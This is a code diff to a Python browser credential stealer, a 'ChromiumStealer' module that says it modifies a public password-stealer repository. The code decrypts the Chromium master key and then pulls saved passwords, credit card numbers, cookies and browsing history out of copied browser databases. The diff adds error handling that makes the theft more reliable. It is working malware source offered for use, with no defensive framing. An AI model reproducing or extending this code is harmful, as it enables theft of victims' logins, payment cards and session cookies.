@@ -1,5 +1,5 @@
 """
-This is a modified version of:
+This is a modified and improved version of:
     https://github.com/henry-richard7/Browser-password-stealer/blob/master/chromium_based_browsers.py
 
 --------------------------------------------------------------------------------------
@@ -80,13 +80,14 @@ class ChromiumStealer(ModuleManager):
             'iridium': appdata + '\\Iridium\\User Data',
         }
 
-    def __get_master_key(self, path: str) -> bytes:
-        if not os.path.exists(path):
+    def __get_master_key(self, browser_path: str, browser_name: str = None) -> bytes:
+        if not os.path.exists(browser_path):
             return
-
-        with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        filename = browser_path + "\\Local State"
+        with open(filename, "r", encoding="utf-8") as f:
             c = f.read()
             if 'os_crypt' not in c:
+                self.merror(f"Unable to get master key for {browser_name} Browser, 'os_crypt' is cannot be found in {filename}")
                 return
             
             local_state = json.loads(c)
@@ -94,7 +95,7 @@ class ChromiumStealer(ModuleManager):
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        self.mdebug(f"Got Master Key for Chromium Browser at PATH: {path}")
+        self.mdebug(f"Got Master Key for {browser_name} Browser at PATH: {browser_path}")
         return master_key
 
 
@@ -104,7 +105,6 @@ class ChromiumStealer(ModuleManager):
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
         decrypted_pass = cipher.decrypt(payload)
         decrypted_pass = decrypted_pass[:-16].decode()
-        self.mdebug(f"Descrypted a password to: {decrypted_pass}")
         return decrypted_pass
 
 
@@ -148,8 +148,12 @@ class ChromiumStealer(ModuleManager):
             os.remove(copy_path)
             self.mdebug(f"[{browser_name}] [{profile}] [passwords] Removing 'login.db' that already exists at {copy_path}")
 
-        shutil.copy(login_db, copy_path)
-
+        try:
+            shutil.copy(login_db, copy_path)
+        except Exception as e:
+            self.merror(f"[{browser_name}] [{profile}] [passwords] Unable to copy {login_db} to {copy_path} -> {e}")
+            return "Error. Please check the Log"
+        
         conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
         cursor.execute('SELECT action_url, username_value, password_value FROM logins')
@@ -157,7 +161,11 @@ class ChromiumStealer(ModuleManager):
         self.mdebug(f"[{browser_name}] [{profile}] [passwords] Connected to copied 'login.db' and ran the query ")
         
         for row in cursor.fetchall():
-            password = self.__decrypt_password(row[2], master_key)
+            try:
+                password = self.__decrypt_password(row[2], master_key)
+            except Exception as e:
+                self.merror(f"[{browser_name}] [{profile}] [passwords] Error in decrypting the password for {row[1]} -> {row[2]} -> {e}")
+                password = "Error. Check the log"
             result += f"""\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}"""
             result += Constant.seperator
             
@@ -184,7 +192,11 @@ class ChromiumStealer(ModuleManager):
             os.remove(copy_path)
             self.mdebug(f"[{browser_name}] [{profile}] [cards] Removing 'cards.db' that already exists at {copy_path}")
             
-        shutil.copy(cards_db, copy_path)
+        try:
+            shutil.copy(cards_db, copy_path)
+        except Exception as e:
+            self.merror(f"[{browser_name}] [{profile}] [cards] Unable to copy {cards_db} to {copy_path} -> {e}")
+            return "Error. Please check the Log"
         
         conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
@@ -195,8 +207,11 @@ class ChromiumStealer(ModuleManager):
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
                 continue
-            
-            card_number = self.__decrypt_password(row[3], master_key)
+            try:
+                card_number = self.__decrypt_password(row[3], master_key)
+            except Exception as e:
+                self.merror(f"[{browser_name}] [{profile}] [cards] Error in decrypting the Card Number for {row[0]} -> {row[3]} -> {e}")
+                card_number = "Error. Check the log"
             result += f"""\nName On Card: {row[0]}\nCard Number: {card_number}\nExpires On:  {row[1]} / {row[2]}\nAdded On: {datetime.fromtimestamp(row[4])}"""
             result += Constant.seperator
             
@@ -223,7 +238,11 @@ class ChromiumStealer(ModuleManager):
             os.remove(copy_path)
             self.mdebug(f"[{browser_name}] [{profile}] [cookies] Removing 'cookies.db' that already exists at {copy_path}")
             
-        shutil.copy(cookie_db, copy_path)
+        try:
+            shutil.copy(cookie_db, copy_path)
+        except Exception as e:
+            self.merror(f"[{browser_name}] [{profile}] [cookies] Unable to copy {cookie_db} to {copy_path} -> {e}")
+            return "Error. Please check the Log"
         
         conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
@@ -235,7 +254,12 @@ class ChromiumStealer(ModuleManager):
             if not row[0] or not row[1] or not row[2] or not row[3]:
                 continue
 
-            cookie = self.__decrypt_password(row[3], master_key)
+            try:
+                cookie = self.__decrypt_password(row[3], master_key)
+            except Exception as e:
+                self.merror(f"[{browser_name}] [{profile}] [cookies] Error in decrypting the cookies for {row[1]} -> {row[3]} -> {e}")
+                cookie = "Error. Check the log"
+                
             result += f"""\nHost Key : {row[0]}\nCookie Name : {row[1]}\nPath: {row[2]}\nCookie: {cookie}\nExpires On: {row[4]}"""
             result += Constant.seperator
 
@@ -262,7 +286,11 @@ class ChromiumStealer(ModuleManager):
             os.remove(copy_path)
             self.mdebug(f"[{browser_name}] [{profile}] [passwords] Removing 'history.db' that already exists at {copy_path}")
 
-        shutil.copy(web_history_db, copy_path)
+        try:
+            shutil.copy(web_history_db, copy_path)
+        except Exception as e:
+            self.merror(f"[{browser_name}] [{profile}] [passwords] Unable to copy {web_history_db} to {copy_path} -> {e}")
+            return "Error. Please check the Log"
         
         # ????????????? NOTE ?????????????
         # If you wish to process history and then save this old way
@@ -306,7 +334,7 @@ class ChromiumStealer(ModuleManager):
 
         for browser in available_browsers:
             browser_path = self.browsers[browser]
-            master_key = self.__get_master_key(browser_path)
+            master_key = self.__get_master_key(browser_path=browser_path, browser_name=browser)
 
             for profile in profiles:
                 self.save_results(
